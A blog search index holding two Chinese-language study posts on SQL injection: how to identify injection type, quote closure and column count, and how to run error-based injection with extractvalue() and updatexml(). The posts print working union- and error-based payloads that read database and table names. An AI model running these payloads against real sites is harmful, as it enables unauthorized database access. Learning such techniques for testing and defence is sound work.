<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>sql注入基础学习</title>
    <url>/2025/07/24/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>注入：通过构造一条精巧的语句，来查询得到想要的信息</p>
<div style="border: 2px solid #4CAF50; padding: 12px; border-radius: 8px; background: #f8f9fa; margin: 15px 0;">
注入分类：
1.按照查询字段：
字符型： "20"，“A”
数字型：23
2.按照注入方法：
Union注入、报错注入、时间注入、布尔注入

<p>3.注入点：可以实现注入的地方</p>
</div>

<h3 id="判断注入方式"><a href="#判断注入方式" class="headerlink" title="判断注入方式"></a>判断注入方式</h3><p>1.如何判断是数字型还是字符型：<br>注入id&#x3D;1 and 1&#x3D;2<br>有回显说明1&#x3D;2成立，说明是字符型注入<br>无回显说明1&#x3D;2不成立，说明是数字型注入</p>
<p>2.注入id&#x3D;1 注入id&#x3D;2-1<br>如果结果相同是数字型注入<br>结果不同字符型注入<br>（一般不用加号，会被理解为空格）</p>
<h3 id="判断闭合方式"><a href="#判断闭合方式" class="headerlink" title="判断闭合方式"></a>判断闭合方式</h3><p>1.种类：<br><strong>‘           “          ‘）     “）</strong></p>
<p>2.闭合的作用：<br>手工提交闭合符号，结束前一段查询语句，后面即可加入其他语句，，查询需要的参数，不需要的语句可以用注释符号’–+‘或’#‘或’%23‘注释掉<br>![[Pasted image 20250720144916.png]]</p>
<p>3.判断方法<br>可以直接再?id&#x3D;1后面加\<br><strong>分析报错信息：看\斜杠后面跟着的字符，是什么字符，它的闭合字符就是什么，若是没有，就为数字型。</strong></p>
<p>4.判断查询列数<br>id&#x3D;1’ order by 3 –+（字符）<br>id&#x3D;1  order by 3  (数字)</p>
<h3 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h3><p>1.查找注入点<br>2.判断是字符型还是数字型注入<br>3.如果是字符型，找到他的闭合方式<br>4.判断查询列数，group by(二分法)<br>5.查询回显位置</p>
]]></content>
      <tags>
        <tag>sql</tag>
      </tags>
  </entry>
  <entry>
    <title>报错注入</title>
    <url>/2025/07/24/blog/</url>
    <content><![CDATA[<h3 id="常用的三个函数如下"><a href="#常用的三个函数如下" class="headerlink" title="常用的三个函数如下"></a>常用的三个函数如下</h3><p>1.extractvalue()<br>2.updatexml()<br>3.floor()</p>
<h3 id="1-extractvalue"><a href="#1-extractvalue" class="headerlink" title="1.extractvalue()"></a>1.extractvalue()</h3><p>两个参数，第一个参数时XML文档名称，第二个参数是路径<br>一般格式如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select extractvalue(doc,&#x27;/book/title&#x27;) from xml</span><br></pre></td></tr></table></figure>

<h4 id="什么时候报错："><a href="#什么时候报错：" class="headerlink" title="什么时候报错："></a>什么时候报错：</h4><p>1.把查询参数路径写错：查询不到内容，但不会报错</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select extractvalue(doc,&#x27;/book/titlle&#x27;) from xml</span><br></pre></td></tr></table></figure>
<p>2.把查询参数格式符号写错：提示报错信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select extractvalue(doc,&#x27;~book/title&#x27;) from xml</span><br></pre></td></tr></table></figure>
<p>因此一般在第二个参数的位置构造语句实现报错</p>
<h4 id="注意点："><a href="#注意点：" class="headerlink" title="注意点："></a>注意点：</h4><p>因为默认只能返回32个字符串，<br>此时需要使用substring函数解决此问题<br>substring函数有三个参数，第一个是我们要查询的内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">substring(concat(0x7e,(select database())),1,30)</span><br></pre></td></tr></table></figure>
<p>此语句的作用是从第一个开始，一次性显示30个字符串，看完前面的再看后面的将得到的信息拼接起来即可，显示1~30个字符</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">substring(concat(0x7e,(select database())),31,30)</span><br></pre></td></tr></table></figure>
<p>显示31~59个字符</p>
<h4 id="利用extracvalue-报错注入"><a href="#利用extracvalue-报错注入" class="headerlink" title="利用extracvalue()报错注入"></a>利用extracvalue()报错注入</h4><p>查库名实现方式：<br>1.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=100&#x27; union select 1,extractvalue(1,concat(0x7e,(select database()))),3 --+（会回显出来正确的数据库的名称）</span><br></pre></td></tr></table></figure>
<ol start="2">
<li></li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=100&#x27; and  1=extractvalue(1,concat(0x7e,(select database()))) --+</span><br></pre></td></tr></table></figure>
<p>concat就是起到拼接作用</p>
<p>查表名实现方式：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=100&#x27; union select 1,extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database()))),3 --+</span><br></pre></td></tr></table></figure>
<h3 id="2-updatexml"><a href="#2-updatexml" class="headerlink" title="2.updatexml()"></a>2.updatexml()</h3><p>三个参数，<br>第一个参数是文档对象的名称，string格式<br>第二个参数是路径<br>第三个参数是new_value,string格式，替换查找到的符合条件的数据</p>
<p>我们构造语句的位置仍然是第二个参数的位置<br>构造方式类似</p>
<h3 id="3-floor报错"><a href="#3-floor报错" class="headerlink" title="3.floor报错"></a>3.floor报错</h3><p>rand()函数:随机返回0~1间的小数<br>floor()函数:小数向下取整数。 </p>
]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>sql</tag>
      </tags>
  </entry>
</search>
